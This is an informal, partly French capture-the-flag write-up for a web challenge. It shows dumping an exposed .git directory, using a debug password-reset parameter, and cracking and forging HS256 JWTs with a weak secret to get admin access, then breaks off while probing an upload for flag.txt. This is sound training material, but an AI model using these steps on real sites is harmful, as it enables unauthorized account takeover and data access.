# Wonka

URL: https://challenge.akerva.com
URL: https://willywonka.shop

 Hint step 2 - the flag is on the backend 
 Hint step 2 - Did u ever cracked a jwt hs256 token 

## Step 1 - Git

https://willywonka.shop/.git/
perl rip-git.pl -v -u https://willywonka.shop/.git/ 

```
go get github.com/c-sto/gogitdumper
gogitdumper -u http://urlhere.com/.git/ -o yourdecideddir/.git/
git log
git checkout
```

```json
commit 7a1756aae221342ab09f9101358201bbfa70a702 (HEAD -> master)
Author: Nicolas Cosnard <nicolas@cosnard.io>
Date:   Thu Jun 13 15:31:50 2019 +0200

    Added debug mode with "debug=1" GET param

commit 8cda59381a6755d33425cb4ccddcc011a85649c6
Author: Nicolas Cosnard <nicolas@cosnard.io>
Date:   Thu Jun 13 15:30:25 2019 +0200

    Initial commit

cat COMMIT_EDITMSG 
Added debug mode with "debug=1" GET param

A wild flag appears !
16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009
```

## Step 2 - JWT

> Next flag is : A ticket 'deadbeef' was submitted. Who's the victim ?

Dans reset: https://willywonka.shop/reset?debug=1

en envoyant avec l'un des users listé sur la page d'accueil.

```xml
xXx_d4rkR0xx0r_xXx
aas
itm4n
meywa
n0wait
qsec
cybiere
```

Password reset instructions for WillyWonka Shop
http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJxc2VjIiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNDM0MTU5LCJleHAiOjE1NjI0MzQ3NTl9.n7HWZ1LKs_S1lJjNRk0VCoIma4uKjkPBrtP6kSvQhrE

JWT contains :

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "sub": "qsec",
  "aud": "frontend.willywonka.shop",
  "iat": 1562434159,
  "exp": 1562434759
}
```

et redirige sur https://willywonka.shop/profile?filetype=image%2Fpng


```powershell
https://backend.willywonka.shop/login
JWT: eyJ1c2VybmFtZSI6Iml0bTRuIn0.XSDI_g._6RclazYRpwomCn8u1EmQmtIudg
s3cr3t
-> JWT admin
backend-session=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWxnIjoiSFMyNTYifQ.e30.0fRod3exHL6E2aBJqKUwiNz-G0wilvJmATxpOXWvqI4


https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJpdG00biIsImF1ZCI6ImJhY2tlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNDI1NjAwLCJleHAiOjE1NjQ0MjY2MDB9.2CztTMndf96UChOTMIAD7Xy-q30S7ZKifJQtXvRb5BI

```json
{
  "username": "admin",
  "alg": "HS256"
}
```

On demande `deadbeef`

```
Victim	Cost
7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318	XBT 1.0
Ticket
1
```


## Step 3 

> Next flag is : There's a flag.txt at the server root

```powershell
https://willywonka.shop/profile?filetype=image%2Fpng
https://willywonka.shop/profile?filetype=text%2Fxml


https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJpdG00biIsImF1ZCI6ImJhY2tlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNDI1NjAwLCJleHAiOjE1NjQ0MjY2MDB9.2CztTMndf96UChOTMIAD7Xy-q30S7ZKifJQtXvRb5BI

https://backend.willywonka.shop/ticket/fb88e246

AutoResize
Error : image mime type doesn't match provided content type. Please re-check upload



```
